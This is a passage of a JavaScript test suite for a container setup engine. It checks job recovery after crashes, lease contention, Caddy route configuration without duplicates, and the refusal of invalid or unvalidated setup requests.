    const start = submitRunnerJob(d, { kind: 'instance_start', app: 'pp-n', params: { container: 'pp-n' }, nowMs: T0 });
    assert.ok(start.job, `a start after an uncertain init is not refused: ${start.error}`);
    // A retry of the uncertain setup never repeats the script either.
    const retry = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: parseJson(getJob(d, 'dead-1').plan_json), retryOf: 'dead-1', nowMs: T0 + 1000 });
    await runAll(d, exec(h, g), c, { inputsDir, kinds: ['guest_setup'] });
    assert.equal(phasesOf(d, retry.id).init_script.state, 'skipped'); assert.match(phasesOf(d, retry.id).init_script.detail, /issued with an unknown outcome/); assert.equal(g.calls.filter((x) => x.phase === 'init').length, 0);
  }
  // (d) the backend's boot sweep for a dead in-process executor: uncertain, released, never re-run.
  {
    const { d } = mk({});
    deadSetup(d, { params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script }, cp, owner: DEAD_BACKEND });
    const dec = reconcileDecision({ job: getJob(d, 'dead-1'), lock: readLock(d, 'pp-n'), nowMs: T0, canAct: false });
    assert.equal(dec.action, 'record_uncertain'); assert.equal(dec.keepStale, false); assert.equal(dec.setup, true);
    const swept = sweepSetupEngineOnBoot(d, { owner: BACKEND, nowMs: T0 });
    assert.deepEqual(swept.interrupted, ['dead-1']);
    assert.equal(getJob(d, 'dead-1').status, 'recovery_required'); assert.equal(getJob(d, 'dead-1').outcome, 'init_uncertain'); assert.equal(readLock(d, 'pp-n'), null);
    assert.equal(phasesOf(d, 'dead-1').init_script.state, 'uncertain'); assert.equal(phasesOf(d, 'dead-1').network_nat.state, 'done', 'what was done stays on the record');
  }
});

test('a dead backend mid-routes: the boot sweep records the routes job interrupted and marks the setup\'s routes phase failed; a retry of the routes job re-renders and never duplicates a row (real schema, fake render)', async (t) => {
  const d = db(); ensureRoutesSchema(d);
  createJob(d, { id: 'setup-1', kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', phases: ['routes'], services: SERVICES, serviceName: 'n' } }, status: 'succeeded', nowMs: T0 - 10_000 });
  createJob(d, { id: 'routes-1', kind: 'configure_routes', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', serviceName: 'n', ip: '10.10.10.7', services: SERVICES, origin: { jobId: 'setup-1', kind: 'guest_setup' } } }, nowMs: T0 - 9_000 });
  const c1 = claimNextJob(d, { owner: DEAD_BACKEND, kinds: ['configure_routes'], nowMs: T0 - 80_000 });
  checkpoint(d, { id: 'routes-1', owner: DEAD_BACKEND, epoch: c1.epoch, phase: 'routes', checkpoint: { resumable: false, disruptive: false, routes: true }, nowMs: T0 - 70_000 });
  const swept = sweepSetupEngineOnBoot(d, { owner: BACKEND, nowMs: T0 });
  assert.deepEqual(swept.interrupted, ['routes-1']); assert.equal(getJob(d, 'routes-1').outcome, 'interrupted');
  assert.equal(phasesOf(d, 'setup-1').routes.state, 'failed'); assert.match(phasesOf(d, 'setup-1').routes.detail, /backend died while configuring the routes/);
  // The retry, through the real guest-routes over the real tables and a fake render.
  const rendered = []; const render = fakeRender(rendered);
  const deps = { configureRoutes: (args) => configureGuestRoutes(d, { name: args.name, ip: args.ip, services: args.services, render }) };
  createJob(d, { id: 'routes-2', kind: 'configure_routes', app: 'pp-n', plan: parseJson(getJob(d, 'routes-1').plan_json), retryOf: 'routes-1', nowMs: T0 });
  let out = await runBackendSteps({ db: d, owner: BACKEND, deps, nowMs: () => T0 + 1 });
  assert.equal(out.ran[0].status, 'succeeded'); assert.deepEqual(out.ran[0].result.created, ['app.example.test', 'api.example.test']); assert.deepEqual(rendered.splice(0), [['app.example.test', 'api.example.test']]);
  assert.equal(phasesOf(d, 'setup-1').routes.state, 'done');
  assert.equal(d.prepare(`SELECT COUNT(*) AS n FROM service_http_routes`).get().n, 2);
  assert.equal(d.prepare(`SELECT target_ip, lxc_container_name FROM services`).get().target_ip, '10.10.10.7');
  // Run it once more (an operator's second retry): existing, re-rendered, no duplicate.
  createJob(d, { id: 'routes-3', kind: 'configure_routes', app: 'pp-n', plan: parseJson(getJob(d, 'routes-1').plan_json), retryOf: 'routes-2', nowMs: T0 + 2 });
  out = await runBackendSteps({ db: d, owner: BACKEND, deps, nowMs: () => T0 + 3 });
  assert.deepEqual(out.ran[0].result.existing, ['app.example.test', 'api.example.test']); assert.deepEqual(out.ran[0].result.created, []);
  assert.equal(d.prepare(`SELECT COUNT(*) AS n FROM service_http_routes`).get().n, 2); assert.deepEqual(rendered, [['app.example.test', 'api.example.test']]);
  assert.equal(readLock(d, 'pp-n'), null); assert.equal(readLock(d, HOST_ROUTES_LOCK), null);
});

// ── 8. the routes step itself ─────────────────────────────────────────────

function ensureRoutesSchema(d) {
  d.exec(`CREATE TABLE services (id TEXT PRIMARY KEY, name TEXT NOT NULL, kind TEXT NOT NULL DEFAULT 'container_service', runtime TEXT, target_ip TEXT, lxc_container_name TEXT, type TEXT NOT NULL, status TEXT DEFAULT 'active', is_admin INTEGER DEFAULT 0, updated_at TEXT DEFAULT CURRENT_TIMESTAMP);
    CREATE TABLE service_http_routes (id TEXT PRIMARY KEY, service_id TEXT NOT NULL, domain TEXT NOT NULL, path_prefix TEXT NOT NULL DEFAULT '/', target_port INTEGER, websocket_enabled INTEGER DEFAULT 0, ssl_enabled INTEGER DEFAULT 1, force_https INTEGER DEFAULT 1, max_upload_size TEXT DEFAULT '1G', strip_prefix INTEGER NOT NULL DEFAULT 0, health_path TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP, UNIQUE(domain, path_prefix));`);
}
// The render bundle lib/route-render.js renderDomains takes: one batch per
// call recorded in `rendered` (closed by the reload; a failed adapt records
// nothing, as the real one restores the site files).
function fakeRender(rendered = [], { fail = null } = {}) {
  let current = [];
  return {
    regenerate: async (db, domain) => { current.push(domain); },
    adapt: async () => { if (fail === 'adapt') { current = []; throw new Error('caddy adapt: syntax'); } },
    reload: async () => { if (current.length) rendered.push(current); current = []; },
    caddyFilePath: (dom) => `/nonexistent/pp-test/${dom}.caddy`, writeConfig: async () => {}, removeConfig: async () => {},
  };
}

test('configureGuestRoutes over the real tables: rows first, the render second; a domain routed to ANOTHER service is a conflict that is never clobbered; a render failure keeps the rows and says so; the upstream move re-renders what the service already served', async () => {
  const d = db(); ensureRoutesSchema(d);
  d.exec(`INSERT INTO services (id, name, type, lxc_container_name) VALUES ('other', 'other', 'docker', 'other'); INSERT INTO service_http_routes (id, service_id, domain, target_port) VALUES ('r0', 'other', 'api.example.test', 80)`);
  const rendered = [];
  let r = await configureGuestRoutes(d, { name: 'n', ip: '10.10.10.7', services: SERVICES, render: fakeRender(rendered) });
  assert.deepEqual(r.created, ['app.example.test']); assert.deepEqual(r.conflicts, [{ domain: 'api.example.test', detail: 'already routed elsewhere; not added' }]); assert.equal(r.renderWarning, null);
  assert.equal(d.prepare(`SELECT service_id FROM service_http_routes WHERE domain = 'api.example.test'`).get().service_id, 'other', 'never clobbered');
  const row = d.prepare(`SELECT * FROM service_http_routes WHERE domain = 'app.example.test'`).get();
  assert.equal(row.target_port, 3000); assert.equal(row.ssl_enabled, 1); assert.equal(row.force_https, 1); assert.equal(row.health_path, null);
  // A render failure on a new guest with a fresh domain: rows kept, warning.
  const d2 = db(); ensureRoutesSchema(d2);
  r = await configureGuestRoutes(d2, { name: 'n', ip: '10.10.10.7', services: [SERVICES[1]], render: fakeRender([], { fail: 'adapt' }) });
  assert.deepEqual(r.created, ['api.example.test']); assert.match(r.renderWarning, /Caddy was not updated: .*syntax/);
  assert.equal(d2.prepare(`SELECT health_path FROM service_http_routes`).get().health_path, '/healthz');
  // The upstream move: the guest recreated at a new address re-renders its existing domain with the new rows.
  const rendered3 = [];
  r = await configureGuestRoutes(d2, { name: 'n', ip: '10.10.10.9', services: SERVICES, render: fakeRender(rendered3) });
  assert.deepEqual(r.existing, ['api.example.test']); assert.deepEqual(r.created, ['app.example.test']);
  assert.equal(d2.prepare(`SELECT target_ip FROM services WHERE lxc_container_name = 'n'`).get().target_ip, '10.10.10.9');
  const svc = findOrCreateLxcService(d2, 'n', '1.2.3.4');
  assert.equal(svc.target_ip, '10.10.10.9', 'find never writes the address');
  const moved = await syncServiceUpstream(d2, svc, '10.10.10.9', fakeRender([]));
  assert.equal(moved.changed, false, 'unchanged address: nothing rendered');
});

// ── 9. unavailable runners, unresolved holds, contention ──────────────────

test('runner-required with no runner: a direct setup is refused (cancelled / runner_unavailable, nothing run) and a create is refused before any launch; with a live runner the create and its setup queue for it and the runner runs both', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const g = scriptedGuest({});
  opsStore(d, h, g, { policy: 'runner-required', inputsDir });
  t.after(() => configureContainerLockStore(null));
  const refused = await runGuestSetup({ containerName: 'pp-n', phases: ['network_nat', 'dns'], via: 'ui' });
  assert.equal(refused.ok, false); assert.equal(refused.step, 'runner_unavailable'); assert.equal(getJob(d, refused.jobId).status, 'cancelled'); assert.equal(lifecycleHttpStatus(refused), 503);
  assert.deepEqual(h.calls, []);
  const create = await runLifecycle({ kind: 'instance_create', containerName: 'pp-q', image: 'images:debian/12', setup: { phases: ['network_nat', 'await_address', 'dns'] }, via: 'ui' });
  assert.equal(create.ok, false); assert.equal(create.step, 'runner_unavailable'); assert.equal(st.launches, undefined);
  runnerHeartbeat(d, { owner: RUNNER, host: 'pp', pid: 300, nowMs: Date.now() });
  const handed = await runLifecycle({ kind: 'instance_create', containerName: 'pp-q', image: 'images:debian/12', setup: { phases: ['network_nat', 'await_address', 'dns'] }, via: 'ui', detach: true });
  assert.equal(handed.ok, true); assert.equal(handed.executor, 'runner'); assert.equal(getJob(d, handed.jobId).status, 'queued'); assert.deepEqual(h.calls, [], 'the backend ran nothing');
  assert.equal(createStatus(d, 'pp-q', { nowMs: Date.now() }).phase, 'downloading');
  const out = await runAll(d, exec(h, g), clock(Date.now()), { inputsDir });
  assert.deepEqual(out.ran.map((j) => [j.kind, j.status]), [['instance_create', 'succeeded'], ['guest_setup', 'succeeded']]);
  assert.equal(getJob(d, out.ran[1].id).owner, RUNNER); assert.equal(createStatus(d, 'pp-q', { nowMs: Date.now() }).phase, 'ready');
  void c;
});

test('unresolved holds: a guest whose restart ended interrupted_uncertain refuses a direct setup at submission (lock stale) and at the executor; a setup FOLLOW-UP meeting the hold is requeued with the lease untouched; after the acknowledgement it runs', async (t) => {
  const d = db(); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const g = scriptedGuest({});
  createJob(d, { id: 'restart-1', kind: 'instance_restart', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n' } }, nowMs: T0 - 50_000 });
  const cl = claimNextJob(d, { owner: DEAD, kinds: ['instance_restart'], nowMs: T0 - 49_000 });
  recordJobOutcome(d, { id: 'restart-1', status: 'recovery_required', outcome: 'interrupted_uncertain', reason: 'owner gone after issuing', by: RUNNER, nowMs: T0 - 40_000 });
  holdStaleLock(d, { app: 'pp-n', owner: DEAD, operation: 'instance_restart', jobId: 'restart-1', epoch: cl.epoch, nowMs: T0 - 40_000 });
  const direct = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['dns'] }, nowMs: T0 });
  assert.equal(direct.code, 'CONTAINER_LOCK_STALE');
  const row = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', phases: ['dns'] } }, nowMs: T0 });
  await runAll(d, exec(h, g), c, { kinds: ['guest_setup'] });
  assert.equal(getJob(d, row.id).status, 'refused'); assert.equal(getJob(d, row.id).outcome, 'lock_stale'); assert.equal(g.calls.length, 0);
  const follow = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', phases: ['dns'], origin: { jobId: 'restart-1', kind: 'instance_restart' } } }, nowMs: T0 + 1 });
  await runAll(d, exec(h, g), c, { kinds: ['guest_setup'] });
  assert.equal(getJob(d, follow.id).status, 'queued', 'requeued, not finished'); assert.ok(listEvents(d, follow.id).some((e) => e.kind === 'hold'));
  assert.ok(readLock(d, 'pp-n')?.stale_since, 'the hold stands'); assert.equal(readLock(d, 'pp-n').recovery_job_id, 'restart-1');
  const { acknowledgeUncertainJob } = await import('../lib/setup-engine/backend.js');
  assert.equal(acknowledgeUncertainJob(d, { id: 'restart-1', by: 'thomas', nowMs: T0 + 2 }).ok, true);
  c.tick(6 * 60_000);
  await runAll(d, exec(h, g), c, { kinds: ['guest_setup'] });
  assert.equal(getJob(d, follow.id).status, 'succeeded');
});

test('contention on the shared network lease: a live holder is waited for and the phase is skipped (contended) when it never lets go — the retry redoes it; a dead holder is taken over; the lease is released afterwards', async (t) => {
  const d = db(); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } }), inst({ name: 'pp-m', config: { 'volatile.uuid': UUID_A } })] }; const h = scriptedHost(st); const g = scriptedGuest({});
  // Another live runner holds the network lease for its own setup and keeps renewing it.
  const held = acquireLock(d, { app: HOST_NETWORK_LOCK, owner: OTHER, operation: 'network_nat', jobId: 'other-1', leaseMs: 10 * 60_000, nowMs: T0 });
  assert.ok(held.ok);
  const s1 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat', 'dns'] }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  const ph = phasesOf(d, s1.job.id);
  assert.equal(ph.network_nat.state, 'skipped'); assert.equal(ph.network_nat.contended, true); assert.match(ph.network_nat.detail, /held by .*20 s waited/);
  assert.equal(ph.dns.state, 'done'); assert.equal(getJob(d, s1.job.id).status, 'failed'); assert.equal(getJob(d, s1.job.id).outcome, 'setup_partial');
  assert.ok(!h.calls.some((a) => a[0] === 'sysctl'), 'no NAT command was issued under another holder\'s lease');
  assert.equal(readLock(d, HOST_NETWORK_LOCK).owner, OTHER, 'the holder\'s lease is untouched');
  // The holder dies: its lease lapses; the next setup takes it over.
  releaseLock(d, { app: HOST_NETWORK_LOCK, owner: OTHER, epoch: held.lock.epoch });
  acquireLock(d, { app: HOST_NETWORK_LOCK, owner: DEAD, operation: 'network_nat', jobId: 'dead-9', leaseMs: 1000, nowMs: T0 - 100_000 });
  const s2 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-m', params: { container: 'pp-m', phases: ['network_nat'] }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  assert.equal(phasesOf(d, s2.job.id).network_nat.state, 'done'); assert.ok(listEvents(d, s2.job.id).some((e) => e.kind === 'lock_takeover' || /took over the host network lease/.test(e.message)));
  assert.equal(readLock(d, HOST_NETWORK_LOCK), null, 'released after the phase'); assert.equal(readLock(d, 'pp-m'), null);
});

test('contention on the routes: a configure_routes job meeting the guest\'s live lease, or the route store\'s, is requeued with a not-before and runs later; two guests\' routes never interleave', async (t) => {
  const d = db(); const asked = [];
  const deps = { configureRoutes: async (args) => { asked.push(args.name); return { created: args.services.map((s) => s.domain), rendered: args.services.map((s) => s.domain) }; } };
  const mk = (id, app, name) => createJob(d, { id, kind: 'configure_routes', app, plan: { steps: [], params: { container: app, serviceName: name, ip: '10.10.10.7', services: [SERVICES[0]], origin: { jobId: 'nope' } } }, nowMs: T0 });
  mk('r-1', 'pp-n', 'n');
  const guestLease = acquireLock(d, { app: 'pp-n', owner: OTHER, operation: 'instance_restart', jobId: 'x', leaseMs: 60_000, nowMs: T0 });
  let out = await runBackendSteps({ db: d, owner: BACKEND, deps, nowMs: () => T0 + 1, sleep: async () => {} });
  assert.deepEqual(out.ran.map((j) => j.status), ['requeued']); assert.equal(getJob(d, 'r-1').status, 'queued'); assert.deepEqual(asked, []);
  releaseLock(d, { app: 'pp-n', owner: OTHER, epoch: guestLease.lock.epoch });
  out = await runBackendSteps({ db: d, owner: BACKEND, deps, nowMs: () => T0 + 2, sleep: async () => {} });
  assert.deepEqual(out.ran, [], 'the not-before holds it back');
  out = await runBackendSteps({ db: d, owner: BACKEND, deps, nowMs: () => T0 + 31_000, sleep: async () => {} });
  assert.deepEqual(out.ran.map((j) => j.status), ['succeeded']); assert.deepEqual(asked, ['n']);
  // The route store held by another backend process: requeued; taken over when that holder is dead.
  mk('r-2', 'pp-m', 'm');
  const storeLease = acquireLock(d, { app: HOST_ROUTES_LOCK, owner: OTHER, operation: 'configure_routes', jobId: 'y', leaseMs: 60_000, nowMs: T0 + 31_000 });
  let now = T0 + 31_001; const tick = { nowMs: () => now, sleep: async (ms) => { now += ms; } };
  out = await runBackendSteps({ db: d, owner: BACKEND, deps, ...tick });
  assert.deepEqual(out.ran.map((j) => j.status), ['requeued']); assert.ok(listEvents(d, 'r-2').some((e) => e.kind === 'requeued' && /route store is being written/.test(e.message))); assert.equal(readLock(d, 'pp-m'), null, 'the guest lease was released with the requeue');
  releaseLock(d, { app: HOST_ROUTES_LOCK, owner: OTHER, epoch: storeLease.lock.epoch });
  acquireLock(d, { app: HOST_ROUTES_LOCK, owner: DEAD_BACKEND, operation: 'configure_routes', jobId: 'z', leaseMs: 1, nowMs: T0 });
  now += 31_000;
  out = await runBackendSteps({ db: d, owner: BACKEND, deps, ...tick });
  assert.deepEqual(out.ran.map((j) => j.status), ['succeeded']); assert.deepEqual(asked, ['n', 'm']); assert.equal(readLock(d, HOST_ROUTES_LOCK), null);
});

test('a lifecycle verb is refused while a guest setup is open, and a setup is refused while a lifecycle verb runs — never queued behind', async (t) => {
  const d = db();
  const open = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', phases: ['dns'] } }, nowMs: T0 });
  const stop = submitRunnerJob(d, { kind: 'instance_stop', app: 'pp-n', params: { container: 'pp-n' }, nowMs: T0 });
  assert.equal(stop.code, 'CONTAINER_BUSY'); assert.match(stop.error, /guest_setup job .* is queued/);
  claimNextJob(d, { owner: RUNNER, kinds: ['guest_setup'], nowMs: T0 });
  void open;
  const d2 = db();
  acquireLock(d2, { app: 'pp-n', owner: RUNNER, operation: 'instance_restart', jobId: 'j', nowMs: T0 });
  const setup = submitRunnerJob(d2, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['dns'] }, nowMs: T0 });
  assert.equal(setup.code, 'CONTAINER_BUSY'); assert.match(setup.error, /the guest setup was refused before any change/);
  const d3 = db();
  const routes = createJob(d3, { kind: 'configure_routes', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', serviceName: 'n', ip: '10.0.0.1', services: [SERVICES[0]] } }, nowMs: T0 });
  const stop2 = submitRunnerJob(d3, { kind: 'instance_stop', app: 'pp-n', params: { container: 'pp-n' }, nowMs: T0 + 1 });
  assert.match(stop2.error, /configure_routes job/); void routes;
});

test('the direct setup surface (a re-run of the setup of a guest that is there): the plan and its digest, an invalid request never reaches the store, the executor runs it and the record shows every phase', async (t) => {
  const d = db(); const c = clock(); const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const g = scriptedGuest({});
  opsStore(d, h, g);
  t.after(() => configureContainerLockStore(null));
  const p1 = resolveSetupPlan(d, { containerName: 'pp-n', phases: ['dns', 'network_nat'], expect: { uuid: UUID_B } });
  assert.ok(p1.ok); assert.deepEqual(p1.params.phases, ['network_nat', 'dns']); assert.notEqual(p1.digest, resolveSetupPlan(d, { containerName: 'pp-n', phases: ['dns'], expect: { uuid: UUID_B } }).digest);
  assert.match(resolveSetupPlan(d, { containerName: 'pp-n', phases: ['routes'] }).error, /services/);
  const bad = await runGuestSetup({ containerName: 'pp-n', phases: ['init_script'], initScript: { ref: 'r', sha256: 'zz', bytes: 1 } });
  assert.equal(bad.code, 'INVALID'); assert.equal(listJobs(d).length, 0);
  const ok = await runGuestSetup({ containerName: 'pp-n', phases: ['network_nat', 'dns'], expect: { uuid: UUID_B }, via: 'ui', requestedBy: 'thomas' });
  assert.equal(ok.ok, true, JSON.stringify(ok)); assert.equal(ok.step, 'setup_complete'); assert.deepEqual(Object.keys(ok.phases), ['network_nat', 'dns']);
  assert.equal(getJob(d, ok.jobId).via, 'ui'); assert.equal(getJob(d, ok.jobId).requested_by, 'thomas');
  void c;
});

test('the executor accepts only what it validates: a guest_setup row carrying the script text, a command, or an unordered plan is refused at claim with nothing run', async (t) => {
  const d = db(); const c = clock(); const h = scriptedHost({ instances: [inst({ name: 'pp-n' })] }); const g = scriptedGuest({});
  for (const params of [{ container: 'pp-n', phases: ['dns'], initScriptText: '#!/bin/sh' }, { container: 'pp-n', phases: ['dns'], command: 'sh' }, { container: 'pp-n', phases: ['routes', 'dns'] }, { container: 'pp-n', phases: ['init_script'], initScript: { ref: 'r', sha256: SHA, bytes: 1, text: 'x' } }]) {
    const row = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params }, nowMs: T0 });
    await runAll(d, exec(h, g), c, { kinds: ['guest_setup'] });
    assert.equal(getJob(d, row.id).status, 'refused', JSON.stringify(params)); assert.equal(getJob(d, row.id).outcome, 'invalid');
  }
  assert.deepEqual(h.calls, []); assert.equal(g.calls.length, 0);
});
